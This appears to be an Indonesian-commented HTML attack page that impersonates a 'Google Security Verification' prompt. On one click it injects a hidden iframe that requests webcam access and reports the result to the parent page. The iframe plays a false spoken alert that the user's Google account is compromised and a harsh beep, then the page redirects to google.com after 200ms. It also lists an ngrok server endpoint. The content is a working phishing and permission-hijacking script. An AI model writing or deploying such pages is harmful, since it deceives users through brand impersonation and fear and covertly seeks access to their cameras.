<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Security Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #fff; color: #333; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; cursor: pointer; }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; border: 1px solid #ddd; }
  h2 { color: #4285f4; margin-bottom: 10px; font-size: 22px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; height: 120px; overflow-y: auto; }
  iframe { display: none; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🔒 Google Security Check</h2>
  <p>Klik untuk memverifikasi akun Google Anda.</p>
  <div id="log">Sistem siap.</div>
</div>

<div id="launcher-container" style="display: none;"></div>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  var executed = false;

  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // KONFIGURASI
  // ============================================
  var TARGET_URL = "https://www.google.com";
  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/";

  // ============================================
  // FUNGSI: BUAT IFRAME TERSEMBUNYI (CAMERA + TTS)
  // ============================================
  function injectHiddenIframe() {
    try {
      log("[+] Membuat Iframe Tersembunyi...");

      var iframe = document.createElement('iframe');
      // Atribut allow untuk kamera, mikrofon, dan autoplay
      iframe.allow = "camera; microphone; autoplay";
      iframe.style.display = "none";
      
      // Tulis payload ke dalam iframe
      iframe.srcdoc = `
        <!DOCTYPE html>
        <html>
        <body>
          <script>
            // 1. Minta Izin Kamera
            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
              .then(function(stream) {
                parent.postMessage({ type: 'CAM_GRANTED' }, '*');
                // Kirim stream ke parent (opsional)
              })
              .catch(function(err) {
                parent.postMessage({ type: 'CAM_DENIED', error: err.name }, '*');
              });

            // 2. Putar TTS
            if ('speechSynthesis' in window) {
              var u = new SpeechSynthesisUtterance("Google Security Alert. Your account has been compromised. Please verify immediately.");
              u.lang = 'en-US';
              u.rate = 0.9;
              u.volume = 1.0;
              window.speechSynthesis.speak(u);
            }

            // 3. Putar Beep (AudioContext)
            try {
              var ctx = new (window.AudioContext || window.webkitAudioContext)();
              if (ctx.state === 'suspended') ctx.resume();
              var osc = ctx.createOscillator();
              osc.type = 'sawtooth';
              osc.frequency.value = 880;
              osc.connect(ctx.destination);
              osc.start();
              osc.stop(ctx.currentTime + 2.0);
            } catch(e) {}
          <\/script>
        </body>
        </html>
      `;

      document.getElementById("launcher-container").appendChild(iframe);
      log("[+] Iframe Tersembunyi disuntikkan.");
    } catch(e) {
      log("[-] Iframe Error: " + e.message);
    }
  }

  // ============================================
  // LISTENER PESAN DARI IFRAME
  // ============================================
  window.addEventListener('message', function(e) {
    if (e.data.type === 'CAM_GRANTED') {
      log("[+] 🚨 Kamera DIIZINKAN (Hidden Iframe)!");
    } else if (e.data.type === 'CAM_DENIED') {
      log("[-] Kamera ditolak: " + e.data.error);
    }
  });

  // ============================================
  // TRIGGER (KLIK)
  // ============================================
  document.body.addEventListener('click', function() {
    if (executed) return;
    executed = true;

    document.getElementById('main-card').innerHTML = `
      <h2>⏳ Memverifikasi...</h2>
      <p>Menghubungkan ke Google...</p>
      <div id="log"></div>
    `;
    logEl = document.getElementById('log');
    log("[!] Memulai Hidden Iframe Hijack...");

    // ============================================
    // A. INJECT IFRAME TERSEMBUNYI (0ms)
    // ============================================
    injectHiddenIframe();

    // ============================================
    // B. REDIRECT KE GOOGLE (Setelah 200ms)
    // ============================================
    // Beri waktu 200ms agar iframe sempat memuat script
    // dan meminta izin sebelum halaman dihancurkan.
    setTimeout(function() {
      log("[+] Redirect ke Google.com...");
      try {
        window.location.href = TARGET_URL;
      } catch(e) {}
    }, 200);

  }, { once: true });

})();
</script>
</body>
</html>
